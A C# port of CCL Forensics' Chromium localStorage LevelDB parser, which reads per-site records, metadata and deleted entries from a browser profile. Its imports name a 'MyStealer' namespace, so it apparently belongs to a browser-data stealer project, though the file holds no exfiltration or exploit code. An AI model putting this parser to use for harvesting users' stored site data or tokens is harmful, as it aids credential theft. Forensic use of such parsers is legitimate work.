// 
// Copyright 2021, CCL Forensics
// Permission is hereby granted, free of charge, to any person obtaining a copy of
// this software and associated documentation files (the "Software"), to deal in
// the Software without restriction, including without limitation the rights to
// use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
// of the Software, and to permit persons to whom the Software is furnished to do
// so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// 

using System.Collections.Generic;
using System;
using System.Text;
using System.IO;
using static CclLevelDb;
using System.Linq;
using System.Collections.Immutable;
using MyStealer.Utils.Chromium.LevelDb;
using MyStealer.Utils.Chromium;

/// <summary>
/// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
/// Check https://github.com/cclgroupltd/ccl_chrome_indexeddb for the original source
/// 
/// Version: 0.3
/// Description: Module for reading the Chromium leveldb localstorage format
/// Contact: Alex Caithness
/// </summary>
public static class CclChromiumLocalStorage
{

    /// <summary>
    /// See: https://source.chromium.org/chromium/chromium/src/+/main:components/services/storage/dom_storage/local_storage_impl.cc
    /// Meta keys:
    ///   Key = ""META:"" + storage_key(the host)
    ///   Value = protobuff: 1=timestamp(varint); 2=size in bytes(varint)
    /// Record keys:
    ///   Key = ""_"" + storage_key + """ + "\\" +@"x0"" + script_key
    ///   Value = record_value
    /// </summary>
    static CclChromiumLocalStorage()
    {
    }

    public static byte[] _META_PREFIX = new byte[] { (byte)'M', (byte)'E', (byte)'T', (byte)'A', (byte)':' };

    public static byte _RECORD_KEY_PREFIX = (byte)'_';

    // 
    //     decodes a type-prefixed string - prefix of: 0=utf-16-le; 1=an extended ascii codepage (likely dependant on locale)
    //     :param raw: raw prefixed-string data
    //     :return: decoded string
    //     
    private static string DecodeString(byte[] raw)
    {
        var prefix = raw[0];
        if (prefix == 0)
            return Encoding.Unicode.GetString(raw, 1, raw.Length - 1);
        else if (prefix == 1)
            return Encoding.Default.GetString(raw, 1, raw.Length - 1);
        else
            throw new ArgumentException("Unexpected prefix: " + prefix);
    }

    public class StorageEntry
    {
        public string StorageKey { get; protected set; }

        public ulong Seq { get; protected set; }
    }

    public class StorageMetadata : StorageEntry
    {
        public DateTime TimeStamp { get; }

        public int SizeInBytes { get; }

        public StorageMetadata(string storageKey, DateTime timestamp, int sizeInBytes, ulong seq)
        {
            StorageKey = storageKey;
            TimeStamp = timestamp;
            SizeInBytes = sizeInBytes;
            Seq = seq;
        }

        public static StorageMetadata FromProtobuff(string storageKey, byte[] data, ulong seq)
        {
            using (var stream = new MemoryStream(data))
            {
                // This is a simple protobuff, so we'll read it directly, but with checks, rather than add a dependency
                var ts_tag = stream.ReadVarInt();
                if ((ts_tag & 0x07) != 0 || ts_tag >> 3 != 1)
                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");

                var timestamp = ChromiumTimeStamp.ToUtc(stream.ReadVarInt());
                var size_tag = stream.ReadVarInt();
                if ((size_tag & 0x07) != 0 || size_tag >> 3 != 2)
                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");

                var size = stream.ReadVarInt();
                return new StorageMetadata(storageKey, timestamp, size, seq);
            }
        }
    }

    public class LocalStorageRecord : StorageEntry
    {
        public string ScriptKey { get; }

        public string Value { get; }

        public bool IsLive { get; }

        public LocalStorageRecord(string storageKey, string scriptKey, string value, ulong seq, bool islive)
        {
            StorageKey = storageKey;
            ScriptKey = scriptKey;
            Value = value;
            Seq = seq;
            IsLive = islive;
        }
    }

    public class LocalStorageBatch
    {
        private readonly StorageMetadata meta;

        public ulong End { get; }

        public LocalStorageBatch(StorageMetadata meta, ulong end_seq)
        {
            this.meta = meta;
            End = end_seq;
        }

        public string StorageKey => meta.StorageKey;

        public DateTime TimeStamp => meta.TimeStamp;

        public ulong Start => meta.Seq;

        public override string ToString() => $"{nameof(LocalStorageBatch)}{{storage_key={StorageKey}, timestamp={TimeStamp}, start={Start}, end={End}}}";
    }

    public class LocalStoreDb : IDisposable
    {

        private readonly IImmutableSet<string> allStorageKeys;

        private readonly ImmutableArray<ulong> batchStarts;

        private readonly IImmutableDictionary<ulong, LocalStorageBatch> batches;

        private readonly IImmutableList<StorageEntry> flatItems;

        private readonly RawLevelDb ldb;

        private readonly IImmutableDictionary<string, IImmutableDictionary<string, IImmutableDictionary<ulong, LocalStorageRecord>>> records;

        private readonly IImmutableDictionary<string, IImmutableDictionary<ulong, StorageMetadata>> storageDetails;

        public LocalStoreDb(string in_dir)
        {
            string storage_key;
            string value = null;

            if (!File.GetAttributes(in_dir).HasFlag(FileAttributes.Directory))
                throw new IOException("Input directory is not a directory");

            ldb = new RawLevelDb(in_dir);

            var storageDetails = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
            var flatItems = ImmutableList.CreateBuilder<StorageEntry>();
            var records = new Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>>();

            foreach (var record in ldb)
            {
                if (record.UserKey.StartsWith(_META_PREFIX) && record.State == KeyState.Live)
                {
                    var metaLen = _META_PREFIX.Length;
                    storage_key = Encoding.Default.GetString(record.UserKey, metaLen, record.UserKey.Length - metaLen);
                    if (!storageDetails.ContainsKey(storage_key))
                        storageDetails[storage_key] = new Dictionary<ulong, StorageMetadata>();

                    var metadata = StorageMetadata.FromProtobuff(storage_key, record.Value, record.Seq);
                    storageDetails[storage_key][record.Seq] = metadata;
                    flatItems.Add(metadata);
                }
                else if (record.UserKey.Length > 0 && record.UserKey[0] == _RECORD_KEY_PREFIX)
                {
                    // We include deleted records here because we need them to build batches
                    (var storage_key_raw, var script_key_raw) = record.UserKey.Split(0x00);
                    storage_key = Encoding.Default.GetString(storage_key_raw, 1, storage_key_raw.Length - 1);

                    var script_key = DecodeString(script_key_raw);
                    try
                    {
                        value = record.State == KeyState.Live ? DecodeString(record.Value) : null;
                    }
                    catch (DecoderFallbackException)
                    {
                        // Some sites play games to test the browser's capabilities like encoding half of a surrogate pair
                        Console.WriteLine("Error decoding record value at seq no {record.seq}; {storage_key} {script_key}:  {record.value}");
                        continue;
                    }

                    if (!records.ContainsKey(storage_key))
                        records[storage_key] = new Dictionary<string, Dictionary<ulong, LocalStorageRecord>>();
                    if (!records[storage_key].ContainsKey(script_key))
                        records[storage_key][script_key] = new Dictionary<ulong, LocalStorageRecord>();

                    var ls_record = new LocalStorageRecord(storage_key, script_key, value, record.Seq, record.State == KeyState.Live);
                    records[storage_key][script_key][record.Seq] = ls_record;
                    flatItems.Add(ls_record);
                }
            }
            this.storageDetails = storageDetails.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<ulong, StorageMetadata>)e.Value.ToImmutableDictionary());
            this.records = records.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<string, IImmutableDictionary<ulong, LocalStorageRecord>>)e.Value.ToImmutableDictionary(f => f.Key, f => (IImmutableDictionary<ulong, LocalStorageRecord>)f.Value.ToImmutableDictionary()));
            allStorageKeys = storageDetails.Keys.Concat(records.Keys).ToImmutableHashSet();
            flatItems.Sort((a, b) => a.Seq.CompareTo(b.Seq));
            this.flatItems = flatItems.ToImmutable();

            // organise batches - this is made complex and slow by having to account for missing/deleted data
            // we're looking for a StorageMetadata followed by sequential (in terms of seq number) LocalStorageRecords
            // with the same storage key. Everything that falls within that chain can safely be considered a batch.
            // Any break in sequence numbers or storage key is a fail and can't be considered part of a batch.
            var batches = ImmutableDictionary.CreateBuilder<ulong, LocalStorageBatch>();
            StorageMetadata current_meta = null;
            var current_end = 0UL;
            foreach (var item in flatItems)
            {
                // pre-sorted
                if (item is LocalStorageRecord)
                {
                    if (current_meta is null)
                    {
                        // no currently valid metadata so we can't attribute this record to anything
                        continue;
                    }
                    else if (item.Seq - current_end != 1 || item.StorageKey != current_meta.StorageKey)
                    {
                        // this record breaks a chain, so bundle up what we have and clear everything out
                        batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
                        current_meta = null;
                        current_end = 0;
                    }
                    else
                    {
                        // contiguous and right storage key, include in the current chain
                        current_end = item.Seq;
                    }
                }
                else if (item is StorageMetadata)
                {
                    if (current_meta != null)
                    {
                        // this record breaks a chain, so bundle up what we have, set new start
                        batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
                    }
                    current_meta = (StorageMetadata)item;
                    current_end = item.Seq;
                }
                else
                {
                    throw new Exception("Unknown item: " + item);
                }
            }
            if (current_meta != null)
                batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
            this.batches = batches.ToImmutable();

            batchStarts = batches.Keys.OrderBy(x => x).ToImmutableArray();
        }

        public virtual IEnumerable<string> EnumerateStorageKeys()
        {
            foreach (var entry in storageDetails.Keys)
                yield return entry;
        }

        public virtual bool ContainsStorageKey(string storageKey) => allStorageKeys.Contains(storageKey);

        public virtual IEnumerable<string> EnumerateScriptKeys(string storageKey)
        {
            if (!allStorageKeys.Contains(storageKey))
                throw new KeyNotFoundException(storageKey);

            if (!records.ContainsKey(storageKey))
            {
                //throw new StopIteration();
                yield break;
            }

            foreach (var entry in records[storageKey].Keys)
                yield return entry;
        }

        public virtual bool ContainsScriptKey(string storageKey, string scriptKey)
            => records.TryGetValue(storageKey, out var entry) && entry.ContainsKey(scriptKey);

        // 
        //         Finds the batch that a record with the given sequence number belongs to
        //         :param seq: leveldb sequence id
        //         :return: the batch containing the given sequence number or None if no batch contains it
        //         
        public virtual LocalStorageBatch FindBatch(ulong seq)
        {
            var bin = batchStarts.BinarySearch(seq, Comparer<ulong>.Default);
            if (bin < 0)
                bin = ~bin;
            var i = bin - 1; // bisect.bisect_left(_batch_starts, seq) - 1
            if (i < 0)
                return null;

            var start = batchStarts[i];
            var batch = batches[start];
            if (batch.Start <= seq && seq <= batch.End)
                return batch;

            return null;
        }

        // 
        //         :param include_deletions: if True, records related to deletions will be included
        //         (these will have None as values).
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_all_records(bool include_deletions = false)
        {
            foreach (var scriptDict in records)
            {
                foreach (var seqDict in scriptDict.Value)
                {
                    foreach (var value in seqDict.Value.Values)
                    {
                        if (value.IsLive || include_deletions)
                            yield return value;
                    }
                }
            }
        }

        // 
        //         :param storage_key: storage key (host) for the records
        //         :param include_deletions: if True, records related to deletions will be included
        //         (these will have None as values).
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_records_for_storage_key(string storage_key, bool include_deletions = false)
        {
            if (!ContainsStorageKey(storage_key))
                throw new KeyNotFoundException(storage_key);

            foreach (var record in records[storage_key])
            {
                foreach (var value in record.Value.Values)
                {
                    if (value.IsLive || include_deletions)
                        yield return value;
                }
            }
        }

        // 
        //         :param storage_key: storage key (host) for the records
        //         :param script_key: script defined key for the records
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_records_for_script_key(string storage_key, string script_key, bool include_deletions = false)
        {
            if (!ContainsScriptKey(storage_key, script_key))
                throw new KeyNotFoundException("storage_key: " + storage_key + " script_key: " + script_key);

            foreach (var value in records[storage_key][script_key].Values)
            {
                if (value.IsLive || include_deletions)
                    yield return value;
            }
        }

        // 
        //         :return: iterable of StorageMetaData
        //         
        public virtual IEnumerable<StorageMetadata> iter_metadata()
        {
            foreach (var meta in flatItems)
            {
                if (meta is StorageMetadata)
                    yield return (StorageMetadata)meta;
            }
        }

        // 
        //         :param storage_key: storage key (host) for the metadata
        //         :return: iterable of StorageMetadata
        //         
        public virtual IEnumerable<StorageMetadata> iter_metadata_for_storage_key(string storage_key)
        {
            if (!allStorageKeys.Contains(storage_key))
                throw new KeyNotFoundException(storage_key);

            if (!storageDetails.ContainsKey(storage_key))
                yield break;

            foreach (var meta in storageDetails[storage_key].Values)
                yield return meta;
        }

        public virtual IEnumerable<KeyValuePair<ulong, LocalStorageBatch>> iter_batches()
        {
            foreach (var batch in batches)
                yield return batch;
        }

        public void Dispose() => ((IDisposable)ldb).Dispose();
    }
}
